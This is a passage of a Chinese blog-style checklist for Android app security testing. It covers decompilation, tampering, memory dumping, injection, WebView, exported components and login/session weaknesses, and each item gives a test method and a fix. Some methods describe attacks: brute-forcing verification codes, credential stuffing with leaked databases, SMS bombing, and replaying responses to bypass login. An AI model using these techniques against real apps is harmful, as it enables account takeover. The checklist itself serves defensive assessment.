测试数据通信时存在明文传输、数据弱加密、中间人攻击漏洞</h3><ul><li>  [ ] Burpsuite/Fiddler</li><li>  [ ] Wireshark</li></ul><p><a id="org703824e"></a></p><h3 id="挂钩工具-解决加密时上述工具无法使用的问题"><a href="#挂钩工具-解决加密时上述工具无法使用的问题" class="headerlink" title="挂钩工具 - 解决加密时上述工具无法使用的问题"></a>挂钩工具 - 解决加密时上述工具无法使用的问题</h3><ul><li>  [ ] Xposed框架<sup><a id="fnr.1" class="footref" href="#fn.1" role="doc-backlink">1</a></sup> 在不修改APK文件的情况下控制程序运行</li><li>  [ ] Frida 开源的跨平台挂钩框架，用来脱壳关键的函数，达到内存转储的目的</li><li>  [ ] inject App进程注入评测工具</li></ul><p><a id="org6e514a2"></a></p><h2 id="App相关的信息资产"><a href="#App相关的信息资产" class="headerlink" title="App相关的信息资产"></a>App相关的信息资产</h2><ul><li>  App文件<sup><a id="fnr.2" class="footref" href="#fn.2" role="doc-backlink">2</a></sup></li><li>  程序进程</li><li>  内存数据</li><li>  前端界面<sup><a id="fnr.3" class="footref" href="#fn.3" role="doc-backlink">3</a></sup></li><li>  本地存储</li><li>  网络通信</li><li>  交互接口</li><li>  云端平台</li></ul><p><a id="org8721875"></a></p><h1 id="程序代码安全测试-APP文件、程序进程"><a href="#程序代码安全测试-APP文件、程序进程" class="headerlink" title="程序代码安全测试 - APP文件、程序进程"></a>程序代码安全测试 - APP文件、程序进程</h1><p><a id="orgdcbf70e"></a></p><h2 id="运行环境测试4"><a href="#运行环境测试4" class="headerlink" title="运行环境测试4"></a>运行环境测试<sup><a id="fnr.4" class="footref" href="#fn.4" role="doc-backlink">4</a></sup></h2><p><a id="orge5164c6"></a></p><h2 id="防反编译测试5"><a href="#防反编译测试5" class="headerlink" title="防反编译测试5"></a>防反编译测试<sup><a id="fnr.5" class="footref" href="#fn.5" role="doc-backlink">5</a></sup></h2><p><a id="org8b4c3f1"></a></p><h3 id="反编译工具检测"><a href="#反编译工具检测" class="headerlink" title="反编译工具检测"></a>反编译工具检测</h3><ol><li><p>检测目的</p><p> 检测App是否可以防止反编译工具，是否具有防逆向保护措施</p></li><li><p>检测方法</p><ol><li> 通过反编译工具对apk文件进行反编译，查看是否具有防逆向保护措施</li><li> 通过IDA Pro等反汇编工具对动态库so文件进行反汇编，查看App是否具有防反汇编的能力</li></ol></li><li><p>检测结论</p><p> 若App的dex文件和so文件无法正常反编译或者App经过加固处理，则通过测试</p></li><li><p>修复建议</p><p> 对App文件结构进行变形或加密，让反编译工具无法识别，或对App文件进行加固处理</p></li></ol><p><a id="orge6edb94"></a></p><h3 id="代码混淆检测"><a href="#代码混淆检测" class="headerlink" title="代码混淆检测"></a>代码混淆检测</h3><ol><li><p>检测目的</p><p> 检测App反编译后的源码是否经过混淆处理</p></li><li><p>检测方法</p><p> 通过反编译工具对apk文件进行反编译，查看代码中的类、字段和方法是否经过混淆处理</p></li><li><p>检测结论</p><p> 若反编译后源码中的类、字段和方法使用a、b、c、d等无意义的字符重命名，则通过测试</p></li><li><p>修复建议</p><p> 对App源码进行混淆处理</p></li></ol><p><a id="org241f12f"></a></p><h3 id="混淆强度检测"><a href="#混淆强度检测" class="headerlink" title="混淆强度检测"></a>混淆强度检测</h3><ol><li><p>检测目的</p><p> 检测App反编译后的源码的混淆强度，查看是否能够有效地保护代码安全</p></li><li><p>检测方法</p><ol><li> 检测dex文件代码中所有的类名、函数名、字段、方法，是否都经过混淆处理，例如反编译后无法正常识别Java层函数的功能</li><li> 检测so文件中所有类名、函数名、字段、方法，是否都经过混淆处理，例如反汇编后无法正常识别Native层函数功能</li></ol></li><li><p>检测结论</p><p> 若反编译后代码*不能识别*出App函数的功能，则通过测试</p></li><li><p>修复建议</p><p> 针对dex文件和so文件的类名、函数名、字段、方法进行高强度混淆</p></li></ol><p><a id="org086bde5"></a></p><h3 id="关键代码-敏感逻辑和数据保护-检测"><a href="#关键代码-敏感逻辑和数据保护-检测" class="headerlink" title="关键代码(敏感逻辑和数据保护)检测"></a>关键代码(敏感逻辑和数据保护)检测</h3><ol><li><p>检测目的</p><p> 检测App是否对关键代码和数据实施有效的保护措施，是否暴露业务逻辑</p></li><li><p>检测方法</p><p> 通过反编译工具对apk文件进行反编译，结合manifest.xml配置文件，分析App注册、登陆、支付过程、加密算法、数据通信等关键功能代码，查看相关代码逻辑是否有明显的暴露</p></li><li><p>检测结论</p><p> 若App关键业务代码(如相关业务字符串)未暴露，且关键数据经过加密和隐藏保护处理，则通过测试</p></li><li><p>修复建议</p><p> 将App关键代码进行隐藏、混淆、加壳等处理，从而无法逆向出重要的代码信息</p></li></ol><p><a id="org69ea40d"></a></p><h2 id="防篡改测试6"><a href="#防篡改测试6" class="headerlink" title="防篡改测试6"></a>防篡改测试<sup><a id="fnr.6" class="footref" href="#fn.6" role="doc-backlink">6</a></sup></h2><p><a id="orgb74ed5b"></a></p><h3 id="程序文件防篡改检测"><a href="#程序文件防篡改检测" class="headerlink" title="程序文件防篡改检测"></a>程序文件防篡改检测</h3><ol><li><p>检测目的</p><p> 检测App启动时是否进行了完整性校验，是否对客户端代码、资源文件进行修改，是否具有防篡改机制</p></li><li><p>检测方法</p><ol><li>使用反编译工具Apktool对目标文件进行反编译<br> <code>java -jar apktool.jar d -f /path/to/test.apk</code></li><li> 修改相关代码，篡改AndroidManifest.xml、assets文件、res文件等</li><li>使用apktool重新打包签名后再运行App查看运行结果<br> <code>java -jar apktool b -f /path/to/test</code></li></ol></li><li><p>检测结论</p><p> 若打包后安装后*不能正常运行*，则通过测试</p></li><li><p>修复建议</p><p> 采用完整性校验技术对安装包进行校验，校验对象包括原包中代码、资源文件、配置文件等所有文件，一旦校验失败，立即退出</p></li></ol><p><a id="orgcd438a0"></a></p><h2 id="防调试测试7"><a href="#防调试测试7" class="headerlink" title="防调试测试7"></a>防调试测试<sup><a id="fnr.7" class="footref" href="#fn.7" role="doc-backlink">7</a></sup></h2><p><a id="org0692e69"></a></p><h3 id="TODO-调试工具防护检测"><a href="#TODO-调试工具防护检测" class="headerlink" title="TODO 调试工具防护检测"></a>TODO 调试工具防护检测</h3><ol><li><p> 检测目的</p></li><li><p> 检测方法</p></li><li><p> 检测结论</p></li><li><p> 修复建议</p></li></ol><p><a id="org4816187"></a></p><h3 id="TODO-调试行为防护检测"><a href="#TODO-调试行为防护检测" class="headerlink" title="TODO 调试行为防护检测"></a>TODO 调试行为防护检测</h3><ol><li><p> 检测目的</p></li><li><p> 检测方法</p></li><li><p> 检测结论</p></li><li><p> 修复建议</p></li></ol><p><a id="org103f672"></a></p><h3 id="内存防护检测"><a href="#内存防护检测" class="headerlink" title="内存防护检测"></a>内存防护检测</h3><ol><li><p>检测目的</p><p> 检测App内存是否具有内存防护功能，防止内存转储</p></li><li><p>检测方法</p><ol><li> 运行App，使用ps命令查看进程PID</li><li> 使用 <code>gdb -p &lt;PID&gt;</code> 挂载App进程后，使用 <code>(gdb) gcore</code> 转储内存</li></ol></li><li><p>检测结论</p><p> 若未生成corefile <code>core.&lt;pid&gt;</code> ,则通过测试</p></li><li><p>修复建议</p><p> 通过监控 <code>/proc/pid/mem</code> 和 <code>/proc/pid/pagemep</code> 来防止内存转储</p></li></ol><p><a id="org6e4485b"></a></p><h2 id="防注入测试8"><a href="#防注入测试8" class="headerlink" title="防注入测试8"></a>防注入测试<sup><a id="fnr.8" class="footref" href="#fn.8" role="doc-backlink">8</a></sup></h2><p><a id="org0649028"></a></p><h3 id="进程防护检测"><a href="#进程防护检测" class="headerlink" title="进程防护检测"></a>进程防护检测</h3><ol><li><p>检测目的</p><p> 检测App进程空间是否可以被注入第三方动态so文件</p></li><li><p>检测方法</p><ol><li> 运行App，通过注入工具或脚本，将第三方动态库文件注入App进程空间，查看第三方动态库是否在进程的内存空间中</li></ol></li><li><p>检测结论</p><p> 若第三方动态库文件*不能注入*到目标进程空间，则通过测试</p></li><li><p>修复建议</p><ul><li>  增加ptrace函数的检测功能，使第三方无法使用该函数附加进程</li><li>  修改linker中的dlopen函数，防止第三方进行so加载</li><li>  定时检测App加载的第三方so库，若发现使被注入的so库，程序进程立即报异常</li></ul></li></ol><p><a id="org98765cf"></a></p><h1 id="服务交互安全测试-程序进程、前段界面、接口端口"><a href="#服务交互安全测试-程序进程、前段界面、接口端口" class="headerlink" title="服务交互安全测试 - 程序进程、前段界面、接口端口"></a>服务交互安全测试 - 程序进程、前段界面、接口端口</h1><p><a id="org6bdf04a"></a></p><h2 id="进程间交互"><a href="#进程间交互" class="headerlink" title="进程间交互"></a>进程间交互</h2><p><a id="org7012d36"></a></p><h3 id="检测目的"><a href="#检测目的" class="headerlink" title="检测目的"></a>检测目的</h3><p>检测进程间数据通信是否具有泄露用户信息的风险</p><p><a id="orge4d99d8"></a></p><h3 id="检测方法"><a href="#检测方法" class="headerlink" title="检测方法"></a>检测方法</h3><p>查看AndroidManifest.xml文件中的<activity>、<provider>、<receiver>、<service>标签内的exported属性是否为false</p><ul><li>  <code>&lt;activity android:exported=&quot;true&quot;</code> 则可以被第三方App启动</li><li>  <code>&lt;provider android:authorities=&quot;com.bgy.ssm.fileprovider&quot; android:exported=&quot;true&quot;</code> 则可以被第三方app调用，实现增、删、改、查</li><li>  <code>&lt;receiver android:exported=&quot;true&quot;</code> 则可以接收第三方App发送的广播消息</li><li>  <code>&lt;service android:enabled=&quot;true&quot; android:exported=&quot;true&quot;</code> 则可以被第三方app启动</li></ul><p><a id="org0f48c98"></a></p><h3 id="检测结论"><a href="#检测结论" class="headerlink" title="检测结论"></a>检测结论</h3><p>客户端App用于跨进程通信的4种组建分别为Activity、ContentProvider、BroadCast、Service<br>在 <strong>未明确要求</strong> 的情况下，只要以上配置中存在任一 <code>exported=true</code> 则测试 <strong>不通过</strong></p><p><a id="org0829600"></a></p><h3 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h3><p>在未明确要求的情况下，在AndroidManifest.xml配置文件中设置该组建的exported属性为false，或对组建进行权限</p><p><a id="org5a97a7a"></a></p><h2 id="屏幕交互"><a href="#屏幕交互" class="headerlink" title="屏幕交互"></a>屏幕交互</h2><p><a id="org5bcf1f3"></a></p><h3 id="界面劫持检测"><a href="#界面劫持检测" class="headerlink" title="界面劫持检测"></a>界面劫持检测</h3><ol><li><p>检测目的</p><p> App是否具有防界面劫持(UI欺骗)功能，防止黑客伪造界面对原有界面进行覆盖，窃取用户和密码等敏感信息</p></li><li><p>检测方法</p><ol><li><p>反编译源码，查看是否具有检测程序进入后台运行的代码, 当程序不是因为触摸返回键和HOME键今后后台运行时，提醒用户具有被劫持的风险</p><pre><code> @Override public boolean onKeyDown(int keyCode, KeyEvent event)&#123;     // 判断程序进入后台运行是否未触摸返回键和HOME键造成的     if((keyCode == KeyEvent.KEYCODE_BACK || keyCode == KeyEvent.KEYCODE_HOME)        &amp;&amp; event.getRepeatCount()==0)&#123;         flag = false;     &#125;     return super.onKeyDown(keyCode, event); &#125; @Override protected void onPause()&#123;     // 程序进入后台如果不是触摸返回键和HOME键造成的，则进行劫持风险提示     if(flag)&#123;         // 弹出警示信息         Toast.makeText(getApplicationContext(),                        &quot;程序已经进入后台运行，具有劫持的风险&quot;,                        Toast.LENGTH_SHORT).show();     &#125;     super.onPause(); &#125;</code></pre></li><li><p> 编写透明界面，当运行至登陆、支付等界面时进行覆盖，查看是否具有风险提示</p></li></ol></li><li><p>修复建议</p><p> 对App的UI界面进行校验，强制将自身UI时刻设置成顶层显示，其中HOME键除外，或自身UI界面进入后台运行后弹框提示用户App已经进入后台运行，有界面劫持风险</p></li></ol><p><a id="org41702b1"></a></p><h3 id="防截-录屏检测"><a href="#防截-录屏检测" class="headerlink" title="防截/录屏检测"></a>防截/录屏检测</h3><ol><li><p>检测目的</p><p> 检测App运行后是否存在防截/录屏保护措施</p></li><li><p>检测方法</p><ol><li> 通过 <code>screencap</code> 命令进行连续截屏，查看界面后的图片是否显示敏感信息</li><li> 通过 <code>screenrecord</code> 命令进行录屏，查看录制后的视频是否显示敏感信息</li></ol></li><li><p>修复建议</p><p> App要实现防截录屏的保护措施</p></li></ol><p><a id="org5f9f4dc"></a></p><h2 id="WebView交互"><a href="#WebView交互" class="headerlink" title="WebView交互"></a>WebView交互</h2><p><a id="org8205a3e"></a></p><h3 id="克隆攻击检测"><a href="#克隆攻击检测" class="headerlink" title="克隆攻击检测"></a>克隆攻击检测</h3><ol><li><p>检测目的</p><p> 检测App中是否存在设置为可被导出的Activity组件，且组建中包含WebView调用，存在导致敏感信息泄露的风险</p></li><li><p>检测方法</p><ol><li> 通过JEB攻击反编译dex文件的源码，查看客户端是否使用了WebView空间，并将 <code>setAllowFileAccessFromeFileURLs</code> 或 <code>setAllowUninvertedFileAccessFromFileURLs</code> API设置为 <code>true</code></li><li> 检测file域的路径是否做了严格限制</li></ol></li><li><p>检测结论</p><p> 若App使用WebView组建，并将 <code>setAllowFileAccessFromeFileURLs</code> 或 <code>setAllowUninvertedFileAccessFromFileURLs</code> API设置为 <code>false</code> ，则通过测试<br> 若App使用WebView组建，并将 <code>setAllowFileAccessFromeFileURLs</code> 或 <code>setAllowUninvertedFileAccessFromFileURLs</code> API设置为 <code>true</code> ，且file域的路径做了严格限制，则通过测试</p></li><li><p>修复建议</p><p> 严格限制包含WebView调用的Activity组建的导出权限，关闭导出权限或限制导出组建的发起者</p></li></ol><p><a id="orgceee83d"></a></p><h3 id="WebView安全检测"><a href="#WebView安全检测" class="headerlink" title="WebView安全检测"></a>WebView安全检测</h3><ol><li><p>检测目的</p><p> 检测App使用的WebView空间加载的外部资源是否存在潜在风险</p></li><li><p>检测方法</p><p> 检测App源码，查看客户端是否对WebView对空间加载的资源文件进行了校验，过滤风险代码</p></li><li><p>检测结论</p><p> App使用WebView空间减灾的HTML未明确要求使用Javascript，<br> 未对加载文件进行校验，或未使用安全的通信协议，<br> 并在WebView加载的程序中有实现发送短信，拨打电话等敏感行为的操作代码，则本项测试不通过</p></li><li><p>修复建议</p><ul><li>  WebView加载的HTML页面，在未明确要求的情况下，禁用Javascript</li><li>  对WebView加载的外部文件进行校验</li><li>  采用HTTPS安全通信协议，不要在WebView加载的外部文件中实现敏感操作的代码</li></ul></li></ol><p><a id="org8fb541b"></a></p><h2 id="接口端口交互"><a href="#接口端口交互" class="headerlink" title="接口端口交互"></a>接口端口交互</h2><p><a id="org4a7dda8"></a></p><h3 id="对象反序列化检测"><a href="#对象反序列化检测" class="headerlink" title="对象反序列化检测"></a>对象反序列化检测</h3><ol><li><p>检测目的</p><p> 检测App是否使用安全的API实现序列化和反序列化，是否存在反序列化漏洞</p></li><li><p>检测方法</p><ol><li> 通过JEB工具反编译dex文件的源码，查看客户端App是否具有实现序列化和反序列化的源代码</li><li> 检测实现序列化和反序列化的API是否具有潜在风险和漏洞</li></ol></li><li><p>检测结论</p><p> 若客户端App不具有序列化和反序列化的代码，或实现序列化和反序列化的API不具有潜在风险和漏洞，则通过测试</p></li><li><p>修复建议</p><p> App采用安全框架的API实现序列化和反序列化</p></li></ol><p><a id="org6df9c6d"></a></p><h3 id="Wormhole漏洞检测"><a href="#Wormhole漏洞检测" class="headerlink" title="Wormhole漏洞检测"></a>Wormhole漏洞检测</h3><ol><li><p>检测目的</p><p> 检测App是否存在Wormhole漏洞</p></li><li><p>检测方法</p><ol><li> 检测App是否私自开启HTTP服务，是否进行身份认证</li><li> 通过nmap工具扫描，检测App代码中是否开放某个TCP端口</li></ol></li><li><p>检测结论</p><p> 如App私自开启了HTTP服务，开放某个TCP端口，同时该服务无身份认证，则本测试 <strong>不通过</strong> </p></li><li><p>修复建议</p><p> App关闭HTTP服务和端口，增加App的访问权限控制机制</p></li></ol><p><a id="org414f599"></a></p><h1 id="鉴权认证安全测试-接口端口、内存数据、网络通信"><a href="#鉴权认证安全测试-接口端口、内存数据、网络通信" class="headerlink" title="鉴权认证安全测试 - 接口端口、内存数据、网络通信"></a>鉴权认证安全测试 - 接口端口、内存数据、网络通信</h1><p><a id="orgf61b415"></a></p><h2 id="注册过程测试"><a href="#注册过程测试" class="headerlink" title="注册过程测试"></a>注册过程测试</h2><p><a id="orge9b7dc3"></a></p><h3 id="注册信息保护检测"><a href="#注册信息保护检测" class="headerlink" title="注册信息保护检测"></a>注册信息保护检测</h3><ol><li><p>检测目的</p><p> 检测App注册密码的复杂度(密码内容要求字母大小写、数字、特殊字符组合，长度等)和注册信息在本地存储时的保护程度是否足够高</p></li><li><p>检测方法</p><ol><li><p>检测App注册密码的复杂度</p><pre><code> public static boolean isPasswordChecked(CharSequence data)&#123;     return Pattern.compile(&quot;^((a-z0-9A-Z)+[_]?)&#123;6,20&#125;$&quot;).matcher(data).find(); &#125;</code></pre></li><li><p> 检测App在本地存储的注册信息是否加密存储，加密密钥是否进行了隐藏处理</p></li></ol></li><li><p>检测结论</p><p> 如果对注册密码复杂度、长度进行了限制处理，且对本地存储的注册信息进行了加密保护，加密密钥隐藏，则通过测试</p></li><li><p>修复建议</p><ul><li>  对注册密码的复杂度和长度进行限制</li><li>  对在本地存在的用户注册信息进行加密处理，隐藏加密密钥</li></ul></li></ol><p><a id="org61850ac"></a></p><h3 id="注册信息传输检测"><a href="#注册信息传输检测" class="headerlink" title="注册信息传输检测"></a>注册信息传输检测</h3><ol><li><p>检测目的</p><p> 检测App将用户注册信息传输到服务器端的过程中是进行了加密保护</p></li><li><p>检测方法</p><p> 使用Burpsuite拦截App注册用户的数据包，查看数据包是否加密</p></li><li><p>检测结论</p><p> 若App在将用户注册信息传输到服务器端时进行了加密处理，则通过测试</p></li><li><p>修复建议</p><p> 在将用户注册信息传输到服务器端的过程中，对用户注册信息进行加密处理</p></li></ol><p><a id="org155ab47"></a></p><h3 id="注册过程防爆破检测"><a href="#注册过程防爆破检测" class="headerlink" title="注册过程防爆破检测"></a>注册过程防爆破检测</h3><ol><li><p>检测目的</p><p> 检测App在注册账户时，是否可以爆破获取正确的验证码，注册任意用户</p></li><li><p>检测方法</p><p> 在注册界面填写完注册信息后，点击&ldquo;获取验证码&rdquo;，使用抓包工具对其抓包，对数据包中的验证码进行暴力破解，爆破成功后，便可注册任意账号</p></li><li><p>检测结论</p><p> 若在注册App时验证码被爆破，可以任意注册账户，则本项测试不通过</p></li><li><p>修复建议</p><ul><li>  使用复杂的验证码，验证码长度不低于6位，包含数字及字母</li><li>  对发送验证码请求进行时间和次数限制</li><li>  验证码在传输时进行有效的加密处理</li></ul></li></ol><p><a id="org0f50b35"></a></p><h3 id="注册过程防嗅探检测"><a href="#注册过程防嗅探检测" class="headerlink" title="注册过程防嗅探检测"></a>注册过程防嗅探检测</h3><ol><li><p>检测目的</p><p> 检测在App注册过程中是否可以利用已有社工库中的手机号、邮箱、用户名、密码等信息，通过撞库方式频繁嗅探注册账户</p></li><li><p>检测方法</p><p> 利用Burpsuite拦截注册用户时的数据包，分析查看是否暴露账户、密码参数，然后利用社工库数据替换账户、密码参数，进行撞库，从而获取用户注册</p></li><li><p>检测结论</p><p> 若在注册时暴露账户、密码参数，具有利用撞库对用户注册信息进行嗅探的风险，则本项测试不通过</p></li><li><p>修复建议</p><ul><li>  对传输的注册账户、密码等敏感信息进行强加密处理</li><li>  服务器端限制访问次数</li></ul></li></ol><p><a id="org1371bd6"></a></p><h2 id="登陆过程测试"><a href="#登陆过程测试" class="headerlink" title="登陆过程测试"></a>登陆过程测试</h2><p><a id="orga447a0e"></a></p><h3 id="密码安全验证检测"><a href="#密码安全验证检测" class="headerlink" title="密码安全验证检测"></a>密码安全验证检测</h3><ol><li><p>检测目的</p><p> 检测App登陆密码的验证方案是在本地验证还是在服务器端验证，验证过程中是否加入了设备信息</p></li><li><p>检测方法</p><p> 利用JEB逆向分析App登陆功能的源码，分析密码验证中是否加密了设备信息IMEI</p></li><li><p>检测结论</p><p> 若密码验证在服务器端进行，且加入了设备信息，避免在非法设备登陆，则通过测试</p></li><li><p>修复建议</p><p> App登陆密码在服务器端进行验证，并加入设备信息，以降低用户登陆密码泄露的风险</p></li></ol><p><a id="orgf9ae294"></a></p><h3 id="登陆信息加密传输检测"><a href="#登陆信息加密传输检测" class="headerlink" title="登陆信息加密传输检测"></a>登陆信息加密传输检测</h3><ol><li><p>检测目的</p><p> 检测App在将用户登录信息传输到服务器端的过程中是否进行了加密保护，以免被攻击者拦截网络流量，窃取用户登陆信息</p></li><li><p>检测方法</p><p> 使用Burpsuite拦截app登陆操作的数据包，分析是否明文传输用户信息</p></li><li><p>检测结论</p><p> 若App在将用户注册信息传输到服务器端时进行了加密处理，则通过测试</p></li><li><p>修复建议</p><p> App在将用户登陆信息传输到服务器端的过程中，要对用户登陆信息进行加密处理</p></li></ol><p><a id="org5300a15"></a></p><h3 id="登陆过程防爆破检测"><a href="#登陆过程防爆破检测" class="headerlink" title="登陆过程防爆破检测"></a>登陆过程防爆破检测</h3><ol><li><p>检测目的</p><p> 检测App在登录时，是否可以抓取数据包，利用数据包中的验证码字段/密码字段进行暴力破解</p></li><li><p>检测方法</p><p> 检测App在登陆时，是否可以爆破验证码/密码，获取正确的验证码和登陆密码</p></li><li><p>检测结论</p><p> 若App在登陆时验证码和登陆密码可以被爆破，则本项测试不通过</p></li><li><p>修复建议</p><ul><li>  使用复杂的验证码和登陆密码</li><li>  对发送验证码的请求进行时间和次数限制</li><li>  对验证码、登陆密码进行输入错误次数限制</li><li>  验证码、登录密码在传输时进行有效的加密处理</li></ul></li></ol><p><a id="org771fe4a"></a></p><h3 id="登陆过程防嗅探检测"><a href="#登陆过程防嗅探检测" class="headerlink" title="登陆过程防嗅探检测"></a>登陆过程防嗅探检测</h3><ol><li><p>检测目的</p><p> 检测App是否可以通过爆破验证码实现任意账户登陆、任意重置用户密码等操作</p></li><li><p>检测方法</p><ol><li>验证码爆破检测<br> 在登陆界面填写完手机号等信息后点击“获取验证码”，使用抓包工具对其抓包，对数据中的验证码进行暴力破解，爆破成功后便可实现登陆任意账户、任意重置用户密码</li><li>短信轰炸检测<br> 在登陆界面填写完手机号等信息后点击“获取验证码”，若短信验证码无获取时间、获取次数限制，便可重放发送短信验证码数据进行短信轰炸</li><li>探测是否具有撞库风险<br> 利用工具拦截用户登陆时的数据包，分析查看是否暴露账户、密码参数，然后利用社工库数据替换账户、密码参数进行撞库，从而获取用户登陆信息</li></ol></li><li><p>检测结论</p><p> 若App通过爆破验证码实现登陆任意账户、任意重置用户密码、短信炸弹，或通过撞库获取用户登陆信息，则此项测试 <strong>不通过</strong> </p></li><li><p>修复建议</p><ul><li>  使用复杂验证码、登陆密码</li><li>  对发送验证码的请求进行时间和次数限制</li><li>  对验证码输入错误次数进行限制</li><li>  验证码在传输时进行有效的加密处理</li><li>  服务端限制访问次数</li></ul></li></ol><p><a id="orgbc121bd"></a></p><h3 id="登陆过程防绕过检测"><a href="#登陆过程防绕过检测" class="headerlink" title="登陆过程防绕过检测"></a>登陆过程防绕过检测</h3><ol><li><p>检测目的</p><p> 检测App是否可以绕过验证码登陆任意账户、修改用户ID获取其他用户信息</p></li><li><p>检测方法</p><ol><li> 抓取登陆成功后的响应包，之后退出，在登陆其他用户账户时，用登陆成功的响应包替换登陆失败的数据包，检测是否可以绕过验证码、密码验证，进而成功登陆其他用户的账户</li><li> 修改用户ID，检测是否可以获取任意用户信息，若用户身份认证采用单一ID值判断，攻击者可以修改数据包中的用户ID进行重放，从而获取其他用户信息</li></ol></li><li><p>检测结论</p><p> 若App可以绕过验证码登陆其他用户，或可以修改用户ID获取其他用户信息，则本项测试 <strong>不通过</strong></p></li><li><p>修复建议</p><p> 加强身份验证机制，使用Token或Session机制，设置访问控制策略，敏感数据采用高强度加密传输</p></li></ol><p><a id="orgabc9a4b"></a></p><h3 id="加强认证检测"><a href="#加强认证检测" class="headerlink" title="加强认证检测"></a>加强认证检测</h3><ol><li><p>检测目的</p><p> 检测App客户端是否具有双因子认证机制，保护用户登陆信息</p></li><li><p>检测方法</p><ol><li> 检测App在登陆时，是否具有双因子认证机制(密码+令牌/指纹/设备信息/短信)</li><li> 使用用户登陆信息在新设备登陆时，查看是否具有短信提醒</li></ol></li><li><p>检测结论</p><p> 如Apple具有双因子认证机制和不同设备登录时的短信提醒认证机制，则通过测试</p></li><li><p>修复建议</p><p> App采用双因子认证机制和不同设备登陆短信提醒认证机制，保护用户登陆信息安全</p></li></ol><p><a id="orgfefe1c8"></a></p><h2 id="会话过程测试"><a href="#会话过程测试" class="headerlink" title="会话过程测试"></a>会话过程测试</h2><p><a id="orgf7b44a1"></a></p><h3 id="有状态会话标志检测"><a href="#有状态会话标志检测" class="headerlink" title="有状态会话标志检测"></a>有状态会话标志检测</h3><ol><li><p>检测目的</p><p> 检测客户端与服务器端交互的会话，是否存在复杂的会话ID，同时服务器是否对其进行校验</p></li><li><p>检测方法</p><ol><li> 模拟客户端与服务器端登陆，查看是否采用 <strong>简单的<sub>Session</sub><sub>id方式标识</sub></strong> 客户端</li><li> 利用服务端返回的 <strong>_Session<sub>id构建新的URL</sub></strong> 访问服务器端，查看是否能够绕过验证</li><li> 查看客户端与服务器交互时是否采用 *复杂的Key*，是否存在时间有效性校验，防止被伪造</li></ol></li><li><p>检测结论</p><p> 若客户端与服务器端会话时采用来复杂加密的Key，同时服务器端对客户端发送的Key进行了校验，攻击这无法伪造，服务器端无响应，则通过测试</p></li><li><p>修复建议</p><p> 客户端与服务器端通信会话时采用复杂的算法对随机的<sub>Session</sub><sub>id进行加密</sub>，同时服务器端对随机的<sub>Session</sub><sub>id进行校验</sub></p></li></ol><p><a id="org9be6f93"></a></p><h3 id="无状态会话Token检测"><a href="#无状态会话Token检测" class="headerlink" title="无状态会话Token检测"></a>无状态会话Token检测</h3><ol><li><p>检测目的</p><p> 在客户端与服务器端通信会话过程中，检测是否存在Token机制，是否容易被攻击者截取利用</p></li><li><p>检测方法</p><ol><li> 检测客户端与服务器端通信会话的URL中是否使用携带Token，Token是否明文显示</li><li> 检测客户端与服务器端认证的复杂性，是否采用类似 <strong>UID+Toekn+timestamp+密钥</strong> 的Toekn机制，并尝试破解</li></ol></li><li><p>检测结论</p><p> 若客户端与服务器端通信会话的Toekn能被轻易获取利用或被破解，则本项测试不通过</p></li><li><p>修复建议</p><ul><li>  每次登陆时重新生成Token，并设置有效期，每次操作后更新Token的时间戳，保证Token有效期往后延续</li><li>  为了避免Token被截获，伪造非法请求，在每次请求时，建议采用 <strong>UID+Token+timestamp+密钥+请求参数签名</strong> ，服务器同时验证Token和签名，以保证请求的安全性</li></ul></li></ol><p><a id="org1ce3ca7"></a></p><h3 id="会话不活跃检测"><a href="#会话不活跃检测" class="headerlink" title="会话不活跃检测"></a>会话不活跃检测</h3><ol><li><p>检测目的</p><p> 若客户端与服务器端通信临时终端或长时间不活跃，检测服务器是否立即终止会话</p></li><li><p>检测方法</p><ol><li> 在客户单与服务器端通信过程中，若长时间不操作，然后再操作时，查看客户端与服务器端是否已中断</li><li> 在客户单与服务器端通信过程中，若临时中断，例如打开微信等其他操作，让服务在后台运行，查看客户端与服务器端是否已中断</li></ol></li><li><p>检测结论</p><p> 若客户端与服务器端通信临时中断或长时间不活跃时，服务器端立即与客户端中断会话，需要重新认证，则本项测试结果为通过</p></li><li><p>修复建议</p><p> 在客户端与服务器端通信会话过程中，增加时间的有效性，例如设置时间为5min，若客户端与服务器长时间不活跃或者客户端服务在后台运行，服务器立即中断本次会话</p></li></ol><p><a id="org71ebb3f"></a></p><h3 id="加强认证检测-1"><a href="#加强认证检测-1" class="headerlink" title="加强认证检测"></a>加强认证检测</h3><ol><li><p>检测目的</p><p> 在客户端与服务器端进行敏感交易时，检测服务器端是否存在双因子身份认证机制</p></li><li><p>检测方法</p><ol><li> 检测客户端与服务器端进行支付、转账等敏感交易时，客户端是否需要多个身份认证方式，同时服务器端是否对其双因子进行校验</li><li> 检测客户端与服务器端进行身份认证过程中，数据是否进行加密处理，加密强度如何</li></ol></li><li><p>检测结论</p><p> 若客户端与服务器端存在双因子身份认证，则通过测试</p></li><li><p>修复建议</p><p> App中涉及敏感用户信息的界面，要求使用双因子身份认证机制，例如采用支付密码和用户预留短信验证码等认证方式</p></li></ol><p><a id="org783c152"></a></p><h2 id="登出过程测试"><a href="#登出过程测试" class="headerlink" title="登出过程测试"></a>登出过程测试</h2><p><a id="orga37a056"></a></p><h3 id="会话终止检测"><a href="#会话终止检测" class="headerlink" title="会话终止检测"></a>会话终止检测</h3><ol><li><p>检测目的</p><p> 在用户执行登出操作后，检测服务器端是否立即终止与客户端之间的会话连接</p></li><li><p>检测方法</p><ol><li> 登陆App，执行一些需要在App进行身份验证的操作，并拦截</li><li> 退出App</li><li> 重放步骤1中的操作，显示错误消息或重定向到登录页面</li></ol></li><li><p>检测结论</p><p> 若在客户端用户执行登出操作后，服务器立即终止与客户端之间的会话连接，需要用户重新进行登陆认证</p></li><li><p>修复建议</p><p> 在用户执行登出操作后，立即终止客户端与服务器端的会话连接</p></li></ol><p><a id="org22db691"></a></p><h3 id="残留数据检测"><a href="#残留数据检测" class="headerlink" title="残留数据检测"></a>残留数据检测</h3><ol><li><p>检测目的</p><p> 当用户执行登出操作后，检测服务器是否及时删除客户端对应的Token或<sub>Session</sub><sub>id</sub></p></li><li><p>检测方法</p><p> 操作客户端登出功能，通过用户名、密码、及之前的Token值或<sub>Session</sub><sub>id值能够登陆成功</sub>，则本项测试不通过</p></li><li><p>检测结论</p><p> 在用户执行登出操作后，若客户端使用之前的Token或<sub>Session</sub><sub>id值能够登陆成功</sub>，则本项测试不通过</p></li><li><p>修复建议</p><p> 当用户执行登出操作后，服务端及时删除户端对应的Token或<sub>Session</sub><sub>id值</sub></p></li></ol><p><a id="org13ec53d"></a></p><h2 id="注销过程测试"><a 